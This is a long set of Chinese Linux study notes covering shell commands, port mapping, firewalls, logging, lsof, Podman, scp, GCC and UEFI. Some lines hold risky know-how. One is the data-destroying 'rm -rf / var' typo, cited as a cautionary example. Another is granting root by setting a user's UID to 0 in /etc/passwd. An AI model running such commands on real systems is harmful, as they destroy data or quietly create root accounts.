Linux系统内核由Linus Torvalds维护，提供硬件抽象层等核心功能；Linux发行套件是内核与常用软件的集合，即我们常说的Linux操作系统。

Linux相比Windows具有稳定高效、免费、漏洞少且易修补、多任务多用户、安全的权限策略、适合嵌入式系统、相对不耗资源等特点。

常见Linux系统种类有红帽企业版RHEL、Fedora、CentOS、Deepin、Debian、Ubuntu等。

通过执行ssh root@121.42.11.34命令，输入服务器密码可登录远程服务器，黑色面板是终端即Shell。

Shell是用户与内核交互的对话界面，是命令解释器，支持变量等语法，也是提供小工具的工具箱。常见Shell有sh、bash、csh、tcsh、ksh、zsh、fish，其中bash最常用。

echo $SHELL可查看当前使用的Shell，cat /etc/shells可查看系统安装的所有Shell种类。

pwd命令用于显示当前目录的路径，如[root@iZm5e8dsxce9ufaic7hi3uZ ~]# pwd输出/root。

ls命令用于列出文件和目录，-a显示所有包括隐藏的，-l显示详细列表，-h适合人类阅读，-t按修改时间排序，-i显示inode。

cd命令用于切换目录，cd /跳转到根目录，cd ~跳转到家目录，cd ..跳转到上级目录，cd无参数也回到家目录。

cat命令一次性显示文件所有内容，适合小文件；head显示文件开头几行，默认10行，-n指定行数；tail显示结尾几行，-f实时查看更新。

touch命令用于创建文件，如touch new_file；mkdir创建目录，-p递归创建目录结构，如mkdir -p one/two/three。

cp拷贝文件和目录，-r递归拷贝目录；mv移动或重命名文件/目录，如mv file new_file是重命名。

rm删除文件和目录，-i确认删除，-f强制删除，-r递归删除文件夹，著名操作rm -rf。

ln创建链接，硬链接使两文件共享inode，ln file1 file2；软链接类似快捷方式，ln -s file1 file2。

useradd添加新用户，如useradd lion；passwd修改密码，如passwd lion，需root权限。

chmod修改文件权限，数字表示中r=4、w=2、x=1，如chmod 640 file.txt表示所有者rw、群组r、其他无权限。

locate搜索含关键字的文件目录，需先yum install mlocate安装，updatedb更新数据库，如locate file.txt。

find用于查找文件，格式为find <何处> <何物> <做什么>，如find /var/log -name "syslog"在指定目录查syslog。

yum是CentOS默认包管理工具，yum install安装软件，yum remove删除，yum update更新，切换阿里云源需备份原repo、下载新repo、生成缓存。

man命令查手册，man 3 rand查第三部分rand函数，man ls查ls用法；command --help快速查简要信息。

grep在文件中查找关键字并显示所在行，-i忽略大小写，-n显示行号，-r递归查找，如grep path /etc/profile。

>输出重定向到新文件，会覆盖已有文件；>>追加到文件末尾；|管道将一个命令输出作为另一个输入，如cut ... | sort ...。

w命令显示当前登录用户及活动，包括时间、系统运行时间、负载等；ps显示进程快照，ps -ef列出所有进程；top显示动态进程列表。

标题：Linux如何安装Windows字体
安装WPS Office后，因字体版权限制无Windows字体，需在Linux安装。

可下载从Win10 LTSC2019 ISO提取的7z格式字体包，夸克网盘链接：https://pan.quark.cn/s/5e9bdc9c638a（提取码：ccBP），百度网盘链接：https://pan.baidu.com/s/1tKd_jYkwee-gUbIy_I-7jw（提取码：a4f4）。

Win10镜像可从https://next.itellyou.cn/下载，需挂载镜像，先执行sudo mkdir /mnt/iso创建挂载点，再用sudo mount -o loop 镜像路径 /mnt/iso挂载。

挂载后需安装wimlib/wimtools，命令为sudo apt update和sudo apt install wimtools，再创建Win10Fonts文件夹，用sudo wimextract命令解压install.wim或install.esd中的Fonts文件夹。

安装Win10字体需在系统字体目录建Win10Fonts文件夹，命令sudo mkdir /usr/share/fonts/Win10Fonts，复制ttf、ttc字体，改权限为644，刷新缓存用sudo fc-cache -fv。

标题：Linux或Windows上实现端口映射
服务器多网卡连接不同网络时，可配置转发数据包实现隔离网络中服务通信。

Windows下查询端口映射情况可用命令：netsh interface portproxy show v4tov4。

Windows下查询某一IP的所有端口映射情况，可使用命令：netsh interface portproxy show v4tov4 | find "[IP]"。

Windows下增加端口映射的命令为：netsh interface portproxy add v4tov4 listenaddress=[外网IP] listenport=[外网端口] connectaddress=[内网IP] connectport=[内网端口]。

Windows下删除端口映射的命令是：netsh interface portproxy delete v4tov4 listenaddress=[外网IP] listenport=[外网端口]。

Linux下允许数据包转发需执行：echo 1 >/proc/sys/net/ipv4/ip_forward 等命令。

Linux下设置端口映射的命令为：iptables -t nat -A PREROUTING -p tcp -m tcp --dport [外网端口] -j DNAT --to-destination [内网地址]:[内网端口]。

实验用5台最小化安装的centos 7虚拟机，Server1、2为内网服务器，Server3为外网服务器，Server4双网卡连两个网络。

Server1上用Python搭建HTTP服务：cd ~；echo "server1" > index.html；python -m SimpleHTTPServer 8080。

Linux的Server4临时配置端口映射需允许数据包转发并设置端口映射规则。

Linux的Server4永久配置端口映射，需将临时配置命令追加到/etc/rc.local文件。

Windows的Server4配置端口映射用netsh interface portproxy add v4tov4命令，查看用show v4tov4。

标题：Linux操作的良好习惯总结
线上操作时，测试很重要。曾有人因未测试修改sshd配置，重启后无法登录，幸有备份；还有人用rsync时目录写反且无备份，导致生产数据被删。

执行命令前，Enter键按下前需再三确认，如rm -rf / var这类错误，一旦发生后果严重。

服务器运维应切忌多人操作，曾出现多人同时调试，导致配置文件被乱改，难以确定问题解决原因。

操作前先备份很重要，修改配置文件时，建议注释原选项再复制修改，数据有备份可减少损失。

涉及数据时，要慎用rm -rf，网上有很多因它导致的删除主数据库等运维事故，小失误损失大。

备份操作非常重要，第三方支付网站每两小时完全备份一次，网贷平台每20分钟备份一次。

服务器环境中，稳定大于一切，不求最快但求最稳定、可用，未经测试不要用新软件，如nginx+php-fpm在生产环境中php易挂。

数据保密很重要，如今各种艳照门、路由器后门事件频发，必须做好数据保密。

ssh安全方面，要更改默认端口、禁止root登录，使用普通用户+key认证+sudo规则+ip地址+用户限制，用hostdeny类防爆破解软件，筛选/etc/passwd中login的用户。

生产环境防火墙一定要开，遵循最小原则，drop所有，再放行需要的服务端口。

权限控制要精细，能以普通用户启动的服务坚决不用root，将服务权限控制到最低。

入侵检测和日志监控很重要，用第三方软件检测系统关键文件和服务配置文件改动，如/etc/passwd等；集中监控日志，如/var/log/secure等；用软件检测端口扫描并拉入host.deny。

系统运行监控包括硬件占用率（内存、硬盘、cpu、网卡）、os登录监控、系统关键文件监控，定期监控可预测硬件损坏概率，助力调优。

服务监控针对web、db、lvs等应用，监控相关指标，便于在系统出现性能瓶颈时及时发现解决。

日志监控涉及硬件、os、应用程序的报错和警报信息，系统稳定时用处不大，出问题时没监控会很被动。

性能调优前要深入了解软件运行机制，如知道nginx比apache快的原理，必要时看懂源代码，否则调优文档是空谈。

调优要有框架和先后顺序，数据库服务器调优是最后一步，应先从硬件和操作系统入手，分析瓶颈、查看日志、确定方向再操作。

性能调优时每次只调一个参数，否则会迷糊；需基准测试判断效果，测试要接近业务真实需求，参数调优要符合业务场景。

运维时要控制心态，很多误删发生在下班前或烦躁时，烦躁时应避免处理关键数据，有压力更要冷静，否则损失更大。

运维人员要对数据负责，生产环境和数据库不是儿戏，不备份后果严重。

运维要追根究底，曾有客户网站因内存不足、无swap分区，导致OOM kill mysqld进程，表损坏，修复后反复出现，最终升级内存解决。

重要操作前要确认所在机器，尽量避免多开窗口，区分测试和生产环境。

标题：Linux日志分析及日志管理
Linux系统中，日志记录系统中内核、服务和其它应用程序等的运行信息，解决问题时可帮助快速定位问题。日志由syslog守护进程处理，其配置文件位于/etc/syslog或/etc/syslogd或/etc/rsyslog.d，默认配置文件为/etc/syslog.conf或rsyslog.conf。

UOS系统日志分为应用日志和系统日志。应用日志目录多为~/.cache/deepin/，如影院日志在~/.cache/deepin/deepin_movie/deepin-movie.log；部分在/var/log/，如uos应用商店日志在/var/log/lastore/daemon.log。

查看应用日志可用cat/more/less/tail/head等命令，如用less结合grep查看错误日志：less ~/.cache/deepin/deepin-movie/deepin-movie.log |grep Error；用tail -f实时监控：tail -f ~/.cache/deepin/deepin-movie/deepin-movie.log。

Linux系统日志类型包括auth（用户认证日志）、authpriv（类似auth，仅特定用户查看）、console（系统控制台消息）、cron（计划任务日志）等。

Linux日志级别数值越小优先级越高，0为emerg（紧急情况，系统不可用），1为alert（需立即修复），2为crit（危险情况），3为err（一般错误），4为warning（警告）等。

rsyslog.conf配置文件基本格式为“服务名称[连接符号]日志等级 日志记录位置”，如user.err /var/log/user.err。连接符号“.”表示记录当前等级及更高等级日志，“.=”表示只记录所需等级，“.!”表示除该等级外都记录。

修改rsyslog.conf后需重启rsyslog服务，命令有sudo service rsyslog restart、/etc/init.d/rsyslog restart、systemctl restart rsyslog。查看服务状态可用chkconfig --list rsyslog或systemctl status rsyslog。

logrotate用于日志轮替，配置文件为/etc/logrotate.conf。dateext参数注释时，日志轮替会改名，如user日志第一次转存为user.1，第二次user.1改为user.2等，到一定规则压缩为user.x.gz；开放则用日期作为后缀，如user-20200628。

自定义日志轮替有两种方法：直接修改/etc/logrotate.conf写入轮替策略；在/etc/logrotate.d/目录新建轮替文件写入规则，推荐后者。logrotate依赖系统定时任务，/etc/cron.daily/目录有logrotate文件，也可用logrotate命令直接轮替，如logrotate -f /etc/logrotate.d/logfile。

/var/log/messages包含整体系统信息及系统启动日志，还有mail、cron等内容；/var/log/dmesg含内核缓冲信息，系统启动时硬件信息可用dmesg查看；/var/log/auth.log含系统授权信息。

journalctl工具用于检索systemd日志，包括内核、系统及服务日志。不带选项显示全部日志，--no-pager不分页输出，-b查看本次启动日志，-f实时滚动显示最新日志。

标题：Linux更新内核设备驱动中“可加载固件”的方法
"可加载固件"是Linux内核设备驱动的非开源部分，由设备厂商提供，在设备使用时由内核设备驱动的开源部分加载。

可加载固件通常由发行版提供，但发行版提供的版本通常不新，缺少很多新设备的可加载固件，或者与新内核不兼容。

如果你有不能驱动的设备，或者安装新版本内核后设备工作不正常，可以尝试更新可加载驱动。

安装git和make，Debian、Ubuntu、Deepin、UOS用sudo apt update和sudo apt install git make；Fedora用sudo dnf install git make；Archlinux用sudo pacman -Sy git make。

安装最新可加载固件的命令：git clone --depth=1 https://mirrors.tuna.tsinghua.edu.cn/git/linux-firmware.git；cd linux-firmware；sudo make install。

更新启动映像文件，Debian、Ubuntu、Deepin、UOS用sudo update-initramfs -k all -u；Fedora用sudo dracut --force --no-hostonly；Archlinux用sudo mkinitcpio -P。

更新可加载固件最后需要重启才能生效。

标题：Linux服务器必备的安全设置
修改SSH登陆配置需编辑/etc/ssh/sshd_config，可更改端口、禁用版本1协议、禁止root登录和空密码登陆，修改后重启sshd服务。

禁止系统响应ping请求的命令是echo “1”> /proc/sys/net/ipv4/icmp_echo_ignore_all，默认值为0。

用户管理可查看用户和组列表、当前登录用户及登录历史，需删除多余用户和组，还可修改相关文件权限。

创建新用户用adduser username，改密码用passwd username。修改sudoers文件需先加写权限，改后收回。

赋予root权限有三种方法：修改sudoers文件去掉wheel组注释并改用户组；在sudoers文件root行下加用户行；修改/etc/passwd文件用户ID为0。

标题：Linux查看进程占用网速和流量使用情况
Linux查看进程占用网速和流量使用情况可使用vnstat、iftop、nethogs（推荐），都需额外安装，用yum或apt-get。

vnstat可查看接口统计报告，命令vnstat -i eth0 -l显示实时流量情况，ctrl+c结束后显示监控期间流量统计结果，其他用法看--help。

iftop可监控网卡实时流量（可指定网段）、反向解析IP、显示端口信息等。-i设定监测网卡，如iftop -i eth1；-B以bytes为单位显示流量；-n使host信息默认显示IP；-N使端口信息默认显示端口号。

iftop交互命令：按n切换显示本机IP或主机名；按s切换是否显示本机host信息；按d切换是否显示远端目标主机host信息；按t切换显示格式；按N切换显示端口号或服务名称；按S切换是否显示本机端口信息；按D切换是否显示远端目标主机端口信息；按p切换是否显示端口信息。

nethogs按进程实时统计网络带宽利用率（推荐）。命令：nethogs -d 5设置5秒刷新一次；nethogs eth0监视eth0带宽；nethogs eth0 eth1同时监视eth0和eth1。

nethogs交互命令（键盘快捷键）：m修改单位；r按流量排序；s按发送流量排序；q退出命令提示符。

标题：Linux程序编译过程详解
GCC是GNU Compiler Collection的简称，是Linux系统上常用的编译工具。

GCC工具链软件包括GCC、Binutils、C运行库等。

Binutils中的as主要用于汇编。

Binutils中的ld主要用于链接。

在linux中静态库是以.a为后缀的文件，共享库是以.so为后缀的文件。

静态库的代码在编译过程中已经被载入可执行程序，共享库的代码是在可执行程序运行时才载入内存的。

使用gcc进行预处理的命令为：gcc -E hello.c -o hello.i，选项-E使GCC在进行完预处理后即停止。

预处理过程包括：删除所有的#define，展开所有宏定义，处理#include预编译指令，删除所有注释，添加行号和文件标识，保留#pragma指令。

使用gcc进行编译的命令为：gcc -S hello.i -o hello.s，选项-S使GCC在执行完编译后停止，生成汇编程序。

编译过程是对预处理完的文件进行词法分析、语法分析、语义分析及优化后生成相应的汇编代码。

使用gcc进行汇编的命令为：gcc -c hello.s -o hello.o，选项-c使GCC在执行完汇编后停止，生成目标文件。

汇编过程将汇编代码处理生成处理器能识别的指令，保存在后缀为.o的目标文件中。

静态链接是指在编译阶段直接把静态库加入到可执行文件中去，这样可执行文件会比较大。

动态链接是指链接阶段仅仅只加入一些描述信息，而程序执行时再从系统中把相应动态库加载到内存中去。

在Linux系统中，可以用ldd命令查看一个可执行程序依赖的共享库。

ELF文件的.text段是已编译程序的指令代码段。

ELF文件的.data段是已初始化的C程序全局变量和静态局部变量。

可以使用readelf -S查看ELF文件各个section的信息。

使用objdump -D可以对ELF文件进行反汇编。

使用objdump -S将ELF文件反汇编并混合显示C语言源代码，需要编译时加上-g选项。

标题：Linux系统收发网络数据包的过程
Linux网络协议栈基于TCP/IP模型，分为应用层、传输层、网络层和网络接口层。

应用层为用户提供FTP、Telnet、DNS、SMTP等服务。

传输层定义了TCP和UDP协议，提供端到端通信功能。

网络层解决主机到主机通信，有IP、IGMP、ICMP协议。

网络接口层对应OSI物理层和数据链路层，ARP工作在此层。

网络数据包到达网卡后，存入接收队列，通过DMA写入Ring Buffer。

网卡向CPU发起硬件中断，CPU找到中断处理函数。

硬件中断处理函数会屏蔽网卡中断，发起软中断后恢复中断。

ksoftirqd线程收到软中断后，调用处理函数轮询处理数据，将网络包交协议栈。

网络接口层检查报文合法性，找出上层协议类型，去掉帧头帧尾交网络层。

网络层确认网络包给本机后，取出上层协议类型，去掉IP头交传输层。

传输层根据四元组找出对应Socket，将数据拷贝到其接收缓冲区。

应用层程序调用Socket接口，将内核接收缓冲区数据拷贝到应用层缓冲区。

应用程序调用Socket发送接口，从用户态陷入内核态套接字层。

套接字层申请sk_buff内存，拷贝用户数据，加入Socket发送缓冲区。

传输层为数据包添加TCP头，拷贝sk_buff副本以支持重传。

网络层选取路由、填充IP头、过滤、分片后交网络接口层。

网络接口层找下一跳MAC地址，填充帧头帧尾，放发送队列，触发软中断。

网卡从FIFO发送队列取数据包发送，完成后发硬中断释放内存。

收到TCP报文的ACK应答时，传输层释放原始的sk_buff。

标题：linux软件包管理工具apt工具说明
搜索软件包使用命令：apt-cache search package

查看二进制包基本信息的命令是：apt-cache showpkg package

查看二进制包详细信息使用apt-cache show package，会列出软件包详细信息及用途描述，若系统中已安装该包且有新版本，会一并列出。

查看源码包信息的命令为：apt-cache showsrc package

查看软件包的依赖关系使用apt-cache depends package

查看可以更新的软件包使用apt-show-versions

重新安装软件包可使用--reinstall选项，如：apt-get --reinstall install gdm

删除软件包用apt-get remove package，会连带删除有依赖关系的包，但保留配置文件；彻底删除包及配置文件用apt-get --purge remove package

apt-get clean删除/var/cache/apt/archives和/var/cache/apt/archives/partial目录下锁文件以外的所有文件；apt-get autoclean仅删除不需要再次下载的文件

下载二进制包使用apt-get source packagename

安装本地二进制包（.deb包）用dpkg -i ***.deb

下载源码包用apt-get source packagename，通常下载三个文件：.orig.tar.gz、.dsc和.diff.gz，会自动解压，未安装dpkg-dev则不会自动解压，加-d选项可阻止自动解压

手动解开源码包用dpkg-source -x foo_version-revision.dsc，会解包到packagename-version目录

下载的源码包自动编译成二进制包可指定-b选项：apt-get source packagename -b

在解压后的源码目录（含debian目录）中用dpkg-buildpackage -rfakeroot -uc -b手动编译成二进制包，-b创建二进制包，-S创建源码包，不指定则都创建

安装编译依赖包用sudo apt-get build-dep adduser -y，源码包控制文件中“Build-Depends：”域指出所需附加包

查询包的依赖列表用apt-cache depends；查询包的反向依赖列表用apt-cache rdepends；递归查询包的依赖关系树用apt-rdepends工具

标题：Linux进程管理之四大名捕
Linux进程管理四大名捕由ps、dstat、top、htop命令出演，分别对应无情、铁手、追命、冷血。

ps用于显示当前进程的状态（非动态），选项有UNIX、BSD、GNU三种风格，UNIX风格选项前加“-”，BSD风格不加，GNU风格加两个“-”。

ps常用组合aux中，a显示所有与终端相关的进程，x显示所有与终端无关的进程，u以用户为中心组织进程状态信息。

ps输出中STAT字段含义：R为运行，S为可中断睡眠，D为不可中断睡眠，T为停止，Z为僵死态，+为前台进程，l为多线程进程等。

ps常用组合-ef中，-e显示所有进程，-f显示完整格式的进程信息。

dstat是系统资源统计命令（动态），常用选项-c显示cpu相关信息，-d显示磁盘相关信息，-m显示Memory相关统计数据。

dstat的--top-cpu显示最占用CPU的进程，--top-io显示最占用io的进程，--top-mem显示最占用内存的进程。

top命令动态列出Linux进程，其首部信息中load average表示平均负载（等待运行的队列长度的负载）。

top中%Cpu(s)字段里，us是用户空间占用百分比，sy是内核空间占用百分比，id是空闲百分比，wa是等待IO完成所消耗的百分比。

top内排序：P以占据CPU百分比排序，M以占据内存百分比排序，T以累积占用CPU时间排序。

top命令选项：-d #指定刷新时间间隔（默认3秒），-b以批次方式显示，-n #显示多少批次。

htop是交互式进程查看器，选项-d #指定延迟时间间隔，-u UserName仅显示指定用户的进程，-s COLUME以指定字段排序。

htop常用子命令：l显示选定进程打开的文件列表，s跟踪选定进程的系统调用，t以层级关系显示各进程状态。

标题：Linux防火墙配置iptables和firewalld
防火墙根据系统管理员设定的规则控制数据包进出，保护内网安全，Linux主要有iptables和firewalld两种。

iptables是早期Linux默认静态防火墙，配置文件在/etc/sysconfig/iptables，工作在网络层，用链式规则，仅过滤互联网数据包，需命令行配置，默认允许所有，修改规则需全部刷新。

firewalld是动态防火墙，取代iptables，配置文件在/usr/lib/firewalld和/etc/firewalld，工作在网络层，有区域概念，可过滤内网数据包，支持命令行和图形化配置，默认拒绝所有，可动态修改规则。

iptables和firewalld是防火墙管理程序，真正执行者是内核的netfilter，不建议同时使用。

iptables有raw、mangle、nat、filter表，优先级由高到低。raw表控制状态追踪；mangle表修改数据包；nat表负责地址转换；filter表过滤数据包。

iptables规则链有INPUT（处理入站数据包）、OUTPUT（处理出站数据包）、PREROUTING（路由前处理）、POSTROUTING（路由后处理）、FORWARD（处理转发数据包）。

iptables控制类型：ACCEPT（允许通过）、DROP（丢弃无回应）、REJECT（拒绝有回应）、SNAT（改源地址）、DNAT（改目的地址）、MASQUERADE（伪装公网IP）、LOG（记录日志）。

iptables命令：-nL -t nat查看nat表规则；-P设置默认策略，如iptables -P INPUT DROP；-I插入规则，-A追加规则，-D删除规则，-F清空策略。

firewalld区域：trusted（允许所有）、public（默认，允许ssh等）、external（允许ssh，转发IPv4地址伪装）、block（拒绝所有传入有回应）、drop（丢弃所有传入无回应）。

firewall-cmd命令：--get-zones查可用区域；--get-default-zone查默认区域；--set-default-zone=trusted设默认区域；--zone=drop --add-source=192.168.20.0/24绑定子网与区域。

firewalld配置端口/服务：--zone=public --add-service http允许http；--add-port=123/tcp允许tcp 123端口；--list-all显示当前区域信息。

firewalld端口映射：--permanent --zone=public --add-forward-port=port=888:proto=tcp:toport=22:toaddr=192.168.10.1可配置。

firewalld富规则优先级最高，用--add-rich-rule添加，可按源目地址、端口限制，如允许192.168.100.1访问22端口。

标题：lsof命令
lsof(list open files)是查看进程打开的文件的工具，可查看进程打开的文件、目录及监听的端口等socket信息。

lsof常用选项中，-a指示其它选项之间为与的关系。

lsof的-c <进程名>选项用于输出指定进程所打开的文件。

lsof的-d <文件描述符>选项可列出占用该文件号的进程。

lsof中，+d <目录>输出目录及目录下被打开的文件和目录(不递归)；+D <目录>递归输出目录及目录下被打开的文件和目录。

lsof的-i <条件>选项用于输出符合条件与网络相关的文件。

lsof的-n选项表示不解析主机名，-P选项表示不解析端口号。

lsof的-p <进程号>选项用于输出指定PID的进程所打开的文件。

lsof的-t选项只输出PID。

lsof的-u选项用于输出指定用户打开的文件。

lsof输出中，COMMAND列表示程序的名称，PID列是进程标识符，USER列是进程所有者。

lsof输出的FD列是文件描述符，其中cwd表示当前工作目录，rtd表示根目录，txt表示程序的可执行文件，mem表示内存映射文件。

lsof输出的TYPE列中，REG和DIR分别表示普通文件和目录，CHR和BLK表示字符和块设备，unix、fifo和IPv4/IPv6表示UNIX domain套接字、FIFO队列和相应版本的IP套接字。

查看哪些进程打开了某个文件，可直接指定文件的名称作为lsof的参数，如sudo lsof /bin/bash。

用lsof组合多个选项时，默认是或的关系，添加-a选项可变为与的关系，如sudo lsof -a -p $$ -d0,1,2。

lsof的-c选项可匹配进程程序名称，支持多个-c选项（或关系）、取反（^前缀）和正则表达式，如sudo lsof -c cr、sudo lsof -c ^cr、sudo lsof -c /cr[ao]/.

lsof的-i选项查看网络相关文件，参数格式为[46][protocol][@hostname|hostaddr][:service|port]，46表示IP版本，protocol如TCP/UDP等。

用lsof查看22号端口相关文件的命令是sudo lsof -i:22。

lsof的-U选项输出打开的UNIX domain socket文件，如sudo lsof -a -c sshd -U查看sshd打开的相关文件。

杀掉某个用户打开文件的所有进程，可用命令kill -9 $(lsof -t -u <用户名>)，其中-t选项只输出PID。

统计系统打开的文件总数，可用命令sudo lsof -P -n | wc -l，-P和-n用于提升速度。

恢复被误删但被进程打开的文件，可通过访问进程的文件描述符（/proc/PID/fd/），用IO重定向重建文件，如恢复/var/log/syslog可执行sudo sh -c 'cat /proc/1141/fd/7 > /var/log/syslog'。

lsof的-h选项显示帮助信息，-v选项显示版本信息。

标题：man帮助文档
man是man-db工具和man-pages帮助文档的统称，man-pages有多种语言版本，中文是man-pages-zh_cn包（arch linux中）。

man使用方式为man 分类 条目，如man 2 exit查看exit条目的第二册内容。

man分类：1.程序；2.系统调用；3.库调用；4.特殊文件；5.文件格式；6.游戏；7.杂项；8.系统管理命令；9.内核例程；10.要查看条目有哪些手册用man -f exit。

man选项k：搜索条目和概要中的关键字；f：显示条目所有手册的简短说明；w：显示帮助文档的路径；l：针对文档文件操作；P：格式化工具，默认是less；H：使用浏览器打开，环境变量BROWSER可指定浏览器。

设置BROWSER环境变量：export BROWSER=/opt/microsoft/msedge-dev/msedge，用man -H sh &在后台使用浏览器打开帮助。

用khelpcenter打开帮助：khelpcenter man:sh &，其搜索是man -k，可用正则表达式减少匹配数量。

man搜索使用：man -k man在概要找，匹配多；man -f man在条目找，精准；man -k "^man$"等价man -f man。

info是多页面帮助系统，比man复杂更新，文档数量比man少，info --subnodes -o ls.txt ls将info ls输出到ls.txt。

khelpcenter不能正确识别中文man pages，解决方法：sudo ln -s /usr/share/man/zh_CN /usr/share/man/Chinese。

标题：Podman及容器技术介绍
容器是一种轻量的虚拟化技术；相对于虚拟机，容器一般并不尝试虚拟化硬件及操作系统内核，只虚拟化文件系统、进程、网络等系统组件（俗称用户空间）；因此容器的镜像大小及启动时间大大缩短。

容器的弊端：由于容器一般不选择虚拟化硬件、操作系统内核，因此跟宿主系统及其他容器的隔离不及虚拟机；故容器遭遇入侵攻击时，黑客从容器跳到宿主系统继续攻击的难度相对较易。

Podman 是一个用于创建及管理个别容器的引擎及客户端，一般适合个人用户及开发者使用。

Podman 相对于 Docker 的安全优势：Docker 依靠长期运行的 Docker Daemon 服务，该服务以 root 用户运行，有安全隐患；Podman 则不依靠 root 运行的服务，一般用户能直接创建管理容器，非 root 运行的容器里的 root 用户在宿主系统上只是一般用户，更安全。

Podman 相对于 Docker 的兼容性优势：Docker 引擎依靠的运行时不完全兼容统一容器运行时（CRI）标准；Podman 引擎依靠 CRI-O 运行时，完全兼容 CRI 标准。

在 deepin 23 上安装 Podman：调用 APT 安装，命令为 sudo apt update && sudo apt install -y podman。

验证 Podman 安装：使用 which podman 命令查看podman位置，podman --version 命令查询版本。

运行 Hello World 容器的命令：podman run --rm --name hello-podman docker.io/library/hello-world:latest。

Podman run 命令中 --rm 选项的作用：容器运行完毕后 Podman 会把它自动删掉（但镜像会保留）。

查询本地已下载的镜像使用 podman images 命令。

下载镜像使用 podman pull <镜像名称>:<镜像版本> 命令，例如下载 docker.io/library/nginx 镜像的 1.24 版本，命令为 podman pull docker.io/library/nginx:1.24。

删除镜像使用 podman image rm <镜像名称>:<镜像版本> 命令。

运行容器的基本命令：podman run <镜像名称>:<镜像版本>，建议添加 --name <容器名称> 选项给容器起名字。

查看正在运行的容器使用 podman ps 命令，添加 -a 选项能看到运行及已停止的容器。

删掉容器使用 podman rm <容器名称> 命令。

运行 NGINX Web 服务器容器的命令：podman run --name my-web-server -d -p 8080:80 docker.io/library/nginx:1.24，其中 -d 让容器在后台运行，-p 8080:80 是端口映射（宿主8080端口转发到容器80端口）。

停止容器使用 podman stop <容器名称> 命令。

创建容器镜像需要代码和Dockerfile，Dockerfile指示Podman如何创建镜像。

Dockerfile中FROM指令：指示Podman从指定底层镜像开始创建新镜像。

Dockerfile中WORKDIR指令：指示Podman设置新一层镜像的工作目录。

Dockerfile中COPY指令：指示Podman将文件拷贝到镜像里的工作目录。

Dockerfile中CMD指令：指示Podman设置基于该镜像创建的容器的默认命令。

构建镜像的命令：podman build -t <镜像名称>:<镜像版本> <项目根目录>。

上传镜像到Docker Hub前，需用podman tag命令重命名镜像为<仓库>/<个人或机构名称>/<镜像名称>:<版本>格式，再用podman login登录，podman push上传，最后podman logout注销。

主流容器编排工具：Kubernetes（K8s）占绝对主导地位，还有Docker Swarm、Apache Mesos。

标题：Python中的异常处理
程序运行时的错误如用户输入不合规或文件不存在称为异常，好的程序需处理异常避免中断。

BaseException是所有异常的基类，Exception是常规错误的基类，还有AttributeError、IOError等多种具体异常类型。

Python用try...except语句处理异常，将可能引发异常的语句放try块，发生异常时执行except块。

try...except可捕获所有异常，也可在except后跟异常名称捕获指定异常，还能处理多个异常。

通过except 异常名 as e，打印e可获取异常详细信息，e是异常对象存储具体错误信息。

try...except可结合else，当try语句中没有错误时执行else里的代码。

try...finally...语句中，无论是否发生异常，finally里的代码都会执行。

使用raise语句可主动抛出异常，将相关错误信息发送出去，处理用户错误操作和输入问题。

自定义异常类型需继承Exception类，类的主题内容可自定义。

AttributeError在特性引用或赋值失败时引发，IOError在试图打开不存在文件时引发。

IndexError在使用系列中不存在的索引时引发，KeyError是映射中没有这个键时引发。

NameError在找不到名字时引发，SyntaxError在代码为错误形式时引发。

TypeError是函数或方法接受不适当类型参数时引发，如sum('nick')。

ValueError是函数接受正确类型但值不适当的参数时引发，如int('nick')。

ZeroDivisionError在除法或模除操作的第二个参数为0时引发。

标题：rfkill命令
rfkill命令用于管理系统中的蓝牙和WIFI设备，是内核级别的管理工具，可打开或关闭蓝牙和WIFI功能。

rfkill命令的语法格式为：rfkill [参数] 设备名。

rfkill命令常用参数有list（列出可用设备）、block（关闭设备）、unblock（打开设备）。

使用rfkill list命令可显示系统中已有的WIFI和蓝牙设备信息。

关闭指定编码的设备可使用命令：rfkill block 设备编码。

打开指定编码的设备可使用命令：rfkill unblock 设备编码。

标题：Linux scp命令
Linux scp命令用于Linux之间复制文件和目录，是secure copy的缩写，基于ssh登陆进行安全的远程文件拷贝，是加密的，rcp是不加密的，scp是rcp的加强版。

scp语法：scp [-1246BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file] [-l limit] [-o ssh_option] [-P port] [-S program] [[user@]host1:]file1 [...] [[user@]host2:]file2，简易写法：scp [可选参数] file_source file_target。

scp参数-1：强制使用协议ssh1；-2：强制使用协议ssh2；-4：只使用IPv4寻址；-6：只使用IPv6寻址；-B：使用批处理模式；-C：允许压缩；-p：保留原文件的修改时间，访问时间和访问权限；-q：不显示传输进度条；-r：递归复制整个目录；-v：详细显示输出。

scp参数-c cipher：以cipher加密传输数据；-F ssh_config：指定替代的ssh配置文件；-i identity_file：从指定文件读取传输用的密钥文件；-l limit：限定用户使用的带宽（Kbit/s）；-o ssh_option：使用ssh_config(5)中的参数传递方式；-P port：指定数据传输的端口号；-S program：指定加密传输使用的程序。

从本地复制到远程的命令格式：scp local_file remote_username@remote_ip:remote_folder；scp local_file remote_username@remote_ip:remote_file；scp local_file remote_ip:remote_folder；scp local_file remote_ip:remote_file。

从本地复制目录到远程的命令格式：scp -r local_folder remote_username@remote_ip:remote_folder；scp -r local_folder remote_ip:remote_folder。

从远程复制到本地，将从本地复制到远程的命令的后2个参数调换顺序即可。

如果远程服务器防火墙为scp设置了指定端口，需用-P参数设置端口号，如scp -P 4588 remote@www.runoob.com:/usr/local/sin.sh /home/administrator。

使用scp命令要确保用户具有可读取远程服务器相应文件的权限，否则无法起作用。

标题：sudo命令反应慢的问题
终端使用sudo命令时，输入密码的提示出现速度变慢。

解决sudo命令反应慢的方法：修改/etc/hosts文件，添加127.0.1.1 host_name（host_name为用户名）。

修改/etc/hosts文件可使用命令sudo vi /etc/hosts。

标题：UEFI如何安全启动
CSM是UEFI的兼容性支持模块，用于兼容老BIOS，应关闭，否则可能出现问题。

UEFI相比BIOS的改进包括：简单的引导菜单、无512字节引导扇区限制、突破MBR分区限制、从不限大小的文件启动等。

UEFI启动管理器功能包括控制操作系统引导顺序、管理EFI驱动程序、维护NVRAM等。

UEFI启动步骤：1.主板读取设备引导文件；2.无则读bootx64.efi；3.无则通过网络读PXE服务器引导；4.无则启动efi shell（如有）。

Windows从Win7开始支持UEFI，且需选64位版本。

bcdboot.exe可设定主板引导菜单，复制引导文件到esp引导区，推荐使用。

bootmgfw.efi是Windows的核心引导程序，位于\Windows\Boot\EFI目录。

UEFI引导Windows的基本策略：在主板建立启动菜单，避免争夺bootx64.efi使用权；建立uefi shell工具。

确认主板是否支持UEFI：全新安装可进BIOS选UEFI模式，关CSM和安全启动；已安装可查启动模式，MBR需转换为UEFI。
